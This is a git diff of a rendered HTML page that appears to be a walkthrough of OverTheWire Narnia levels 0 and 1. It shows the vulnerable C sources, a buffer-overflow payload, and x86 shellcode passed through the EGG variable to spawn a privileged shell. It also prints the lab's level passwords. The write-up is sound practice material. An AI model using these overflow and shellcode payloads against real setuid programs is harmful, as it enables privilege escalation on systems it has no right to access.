@@ -2179,6 +2179,20 @@
 
             
           
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../blockchain/tetctftoken/" class="md-nav__link">
+        TetCTFToken
+      </a>
+    </li>
+  
+
+            
+          
         </ul>
       </nav>
     </li>
@@ -2619,45 +2633,45 @@
 </tbody>
 </table>
 
-<div class="highlight"><pre><span></span><code>$ ssh narnia0@narnia.labs.overthewire.org -p <span class="m">2226</span>
-$ <span class="nb">cd</span> /narnia/
-$ ls
-narnia0    narnia1    narnia2    narnia3    narnia4    narnia5    narnia6    narnia7    narnia8
-narnia0.c  narnia1.c  narnia2.c  narnia3.c  narnia4.c  narnia5.c  narnia6.c  narnia7.c  narnia8.c
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>ssh<span class="w"> </span>narnia0@narnia.labs.overthewire.org<span class="w"> </span>-p<span class="w"> </span><span class="m">2226</span>
+$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>/narnia/
+$<span class="w"> </span>ls
+narnia0<span class="w">    </span>narnia1<span class="w">    </span>narnia2<span class="w">    </span>narnia3<span class="w">    </span>narnia4<span class="w">    </span>narnia5<span class="w">    </span>narnia6<span class="w">    </span>narnia7<span class="w">    </span>narnia8
+narnia0.c<span class="w">  </span>narnia1.c<span class="w">  </span>narnia2.c<span class="w">  </span>narnia3.c<span class="w">  </span>narnia4.c<span class="w">  </span>narnia5.c<span class="w">  </span>narnia6.c<span class="w">  </span>narnia7.c<span class="w">  </span>narnia8.c
 </code></pre></div>
-<div class="highlight"><pre><span></span><code>$ cat narnia0.c
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>cat<span class="w"> </span>narnia0.c
 <span class="c1">#include &lt;stdio.h&gt;</span>
 <span class="c1">#include &lt;stdlib.h&gt;</span>
 
-int main<span class="o">(){</span>
-    long <span class="nv">val</span><span class="o">=</span>0x41414141<span class="p">;</span>
-    char buf<span class="o">[</span><span class="m">20</span><span class="o">]</span><span class="p">;</span>
+int<span class="w"> </span>main<span class="o">(){</span>
+<span class="w">    </span>long<span class="w"> </span><span class="nv">val</span><span class="o">=</span>0x41414141<span class="p">;</span>
+<span class="w">    </span>char<span class="w"> </span>buf<span class="o">[</span><span class="m">20</span><span class="o">]</span><span class="p">;</span>
 
-    printf<span class="o">(</span><span class="s2">&quot;Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!\n&quot;</span><span class="o">)</span><span class="p">;</span>
-    printf<span class="o">(</span><span class="s2">&quot;Here is your chance: &quot;</span><span class="o">)</span><span class="p">;</span>
-    scanf<span class="o">(</span><span class="s2">&quot;%24s&quot;</span>,<span class="p">&amp;</span>buf<span class="o">)</span><span class="p">;</span>
+<span class="w">    </span>printf<span class="o">(</span><span class="s2">&quot;Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!\n&quot;</span><span class="o">)</span><span class="p">;</span>
+<span class="w">    </span>printf<span class="o">(</span><span class="s2">&quot;Here is your chance: &quot;</span><span class="o">)</span><span class="p">;</span>
+<span class="w">    </span>scanf<span class="o">(</span><span class="s2">&quot;%24s&quot;</span>,<span class="p">&amp;</span>buf<span class="o">)</span><span class="p">;</span>
 
-    printf<span class="o">(</span><span class="s2">&quot;buf: %s\n&quot;</span>,buf<span class="o">)</span><span class="p">;</span>
-    printf<span class="o">(</span><span class="s2">&quot;val: 0x%08x\n&quot;</span>,val<span class="o">)</span><span class="p">;</span>
+<span class="w">    </span>printf<span class="o">(</span><span class="s2">&quot;buf: %s\n&quot;</span>,buf<span class="o">)</span><span class="p">;</span>
+<span class="w">    </span>printf<span class="o">(</span><span class="s2">&quot;val: 0x%08x\n&quot;</span>,val<span class="o">)</span><span class="p">;</span>
 
-    <span class="k">if</span><span class="o">(</span><span class="nv">val</span><span class="o">==</span>0xdeadbeef<span class="o">){</span>
-        setreuid<span class="o">(</span>geteuid<span class="o">()</span>,geteuid<span class="o">())</span><span class="p">;</span>
-        system<span class="o">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="o">)</span><span class="p">;</span>
-    <span class="o">}</span>
-    <span class="k">else</span> <span class="o">{</span>
-        printf<span class="o">(</span><span class="s2">&quot;WAY OFF!!!!\n&quot;</span><span class="o">)</span><span class="p">;</span>
-        exit<span class="o">(</span><span class="m">1</span><span class="o">)</span><span class="p">;</span>
-    <span class="o">}</span>
+<span class="w">    </span><span class="k">if</span><span class="o">(</span><span class="nv">val</span><span class="o">==</span>0xdeadbeef<span class="o">){</span>
+<span class="w">        </span>setreuid<span class="o">(</span>geteuid<span class="o">()</span>,geteuid<span class="o">())</span><span class="p">;</span>
+<span class="w">        </span>system<span class="o">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="o">)</span><span class="p">;</span>
+<span class="w">    </span><span class="o">}</span>
+<span class="w">    </span><span class="k">else</span><span class="w"> </span><span class="o">{</span>
+<span class="w">        </span>printf<span class="o">(</span><span class="s2">&quot;WAY OFF!!!!\n&quot;</span><span class="o">)</span><span class="p">;</span>
+<span class="w">        </span>exit<span class="o">(</span><span class="m">1</span><span class="o">)</span><span class="p">;</span>
+<span class="w">    </span><span class="o">}</span>
 
-    <span class="k">return</span> <span class="m">0</span><span class="p">;</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="m">0</span><span class="p">;</span>
 <span class="o">}</span>
-$ <span class="o">(</span>python3 -c <span class="s2">&quot;import sys; sys.stdout.buffer.write(b&#39;a&#39; * 20 + int.to_bytes(0xdeadbeef, 4, &#39;little&#39;))&quot;</span><span class="p">;</span> cat<span class="o">)</span> <span class="p">|</span> ./narnia0 
-Correct val<span class="err">&#39;</span>s value from 0x41414141 -&gt; 0xdeadbeef!
-Here is your chance: buf: aaaaaaaaaaaaaaaaaaaaﾭ�
-val: 0xdeadbeef
+$<span class="w"> </span><span class="o">(</span>python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;import sys; sys.stdout.buffer.write(b&#39;a&#39; * 20 + int.to_bytes(0xdeadbeef, 4, &#39;little&#39;))&quot;</span><span class="p">;</span><span class="w"> </span>cat<span class="o">)</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>./narnia0<span class="w"> </span>
+Correct<span class="w"> </span>val<span class="err">&#39;</span>s<span class="w"> </span>value<span class="w"> </span>from<span class="w"> </span>0x41414141<span class="w"> </span>-&gt;<span class="w"> </span>0xdeadbeef!
+Here<span class="w"> </span>is<span class="w"> </span>your<span class="w"> </span>chance:<span class="w"> </span>buf:<span class="w"> </span>aaaaaaaaaaaaaaaaaaaaﾭ�
+val:<span class="w"> </span>0xdeadbeef
 id
-<span class="nv">uid</span><span class="o">=</span><span class="m">14001</span><span class="o">(</span>narnia1<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">14000</span><span class="o">(</span>narnia0<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">14000</span><span class="o">(</span>narnia0<span class="o">)</span>
-cat /etc/narnia_pass/narnia1
+<span class="nv">uid</span><span class="o">=</span><span class="m">14001</span><span class="o">(</span>narnia1<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">14000</span><span class="o">(</span>narnia0<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">14000</span><span class="o">(</span>narnia0<span class="o">)</span>
+cat<span class="w"> </span>/etc/narnia_pass/narnia1
 eaa6AjYMBB
 </code></pre></div>
 <h2 id="level-1">Level 1<a class="headerlink" href="#level-1" title="Permanent link">&para;</a></h2>
@@ -2676,35 +2690,35 @@ eaa6AjYMBB
 </tbody>
 </table>
 
-<div class="highlight"><pre><span></span><code>$ ssh narnia1@narnia.labs.overthewire.org -p <span class="m">2226</span>
-$ <span class="nb">cd</span> /narnia/
-$ cat narnia1.c
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>ssh<span class="w"> </span>narnia1@narnia.labs.overthewire.org<span class="w"> </span>-p<span class="w"> </span><span class="m">2226</span>
+$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>/narnia/
+$<span class="w"> </span>cat<span class="w"> </span>narnia1.c
 <span class="c1">#include &lt;stdio.h&gt;</span>
 
-int main<span class="o">(){</span>
-    int <span class="o">(</span>*ret<span class="o">)()</span><span class="p">;</span>
+int<span class="w"> </span>main<span class="o">(){</span>
+<span class="w">    </span>int<span class="w"> </span><span class="o">(</span>*ret<span class="o">)()</span><span class="p">;</span>
 
-    <span class="k">if</span><span class="o">(</span>getenv<span class="o">(</span><span class="s2">&quot;EGG&quot;</span><span class="o">)==</span>NULL<span class="o">){</span>
-        printf<span class="o">(</span><span class="s2">&quot;Give me something to execute at the env-variable EGG\n&quot;</span><span class="o">)</span><span class="p">;</span>
-        exit<span class="o">(</span><span class="m">1</span><span class="o">)</span><span class="p">;</span>
-    <span class="o">}</span>
+<span class="w">    </span><span class="k">if</span><span class="o">(</span>getenv<span class="o">(</span><span class="s2">&quot;EGG&quot;</span><span class="o">)==</span>NULL<span class="o">){</span>
+<span class="w">        </span>printf<span class="o">(</span><span class="s2">&quot;Give me something to execute at the env-variable EGG\n&quot;</span><span class="o">)</span><span class="p">;</span>
+<span class="w">        </span>exit<span class="o">(</span><span class="m">1</span><span class="o">)</span><span class="p">;</span>
+<span class="w">    </span><span class="o">}</span>
 
-    printf<span class="o">(</span><span class="s2">&quot;Trying to execute EGG!\n&quot;</span><span class="o">)</span><span class="p">;</span>
-    <span class="nv">ret</span> <span class="o">=</span> getenv<span class="o">(</span><span class="s2">&quot;EGG&quot;</span><span class="o">)</span><span class="p">;</span>
-    ret<span class="o">()</span><span class="p">;</span>
+<span class="w">    </span>printf<span class="o">(</span><span class="s2">&quot;Trying to execute EGG!\n&quot;</span><span class="o">)</span><span class="p">;</span>
+<span class="w">    </span><span class="nv">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>getenv<span class="o">(</span><span class="s2">&quot;EGG&quot;</span><span class="o">)</span><span class="p">;</span>
+<span class="w">    </span>ret<span class="o">()</span><span class="p">;</span>
 
-    <span class="k">return</span> <span class="m">0</span><span class="p">;</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="m">0</span><span class="p">;</span>
 <span class="o">}</span>
 <span class="c1"># 可以执行 shellcode</span>
 <span class="c1"># 参考 narnia0 需要先 setreuid(geteuid(), geteuid())</span>
 <span class="c1"># http://shell-storm.org/shellcode/files/shellcode-399.html</span>
-$ <span class="nv">EGG</span><span class="o">=</span><span class="sb">`</span>python3 -c <span class="s2">&quot;import sys; sys.stdout.buffer.write(b&#39;\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80&#39;)&quot;</span><span class="sb">`</span> ./narnia1
-Trying to execute EGG!
-$ id
-<span class="nv">uid</span><span class="o">=</span><span class="m">14002</span><span class="o">(</span>narnia2<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">14001</span><span class="o">(</span>narnia1<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">14001</span><span class="o">(</span>narnia1<span class="o">)</span>
-$ cat /etc/narnia_pass/narnia2
+$<span class="w"> </span><span class="nv">EGG</span><span class="o">=</span><span class="sb">`</span>python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;import sys; sys.stdout.buffer.write(b&#39;\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80&#39;)&quot;</span><span class="sb">`</span><span class="w"> </span>./narnia1
+Trying<span class="w"> </span>to<span class="w"> </span>execute<span class="w"> </span>EGG!
+$<span class="w"> </span>id
+<span class="nv">uid</span><span class="o">=</span><span class="m">14002</span><span class="o">(</span>narnia2<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">14001</span><span class="o">(</span>narnia1<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">14001</span><span class="o">(</span>narnia1<span class="o">)</span>
+$<span class="w"> </span>cat<span class="w"> </span>/etc/narnia_pass/narnia2
 Zzb6MIyceT
-$ <span class="nb">exit</span>
+$<span class="w"> </span><span class="nb">exit</span>
 </code></pre></div>
 
   <hr>
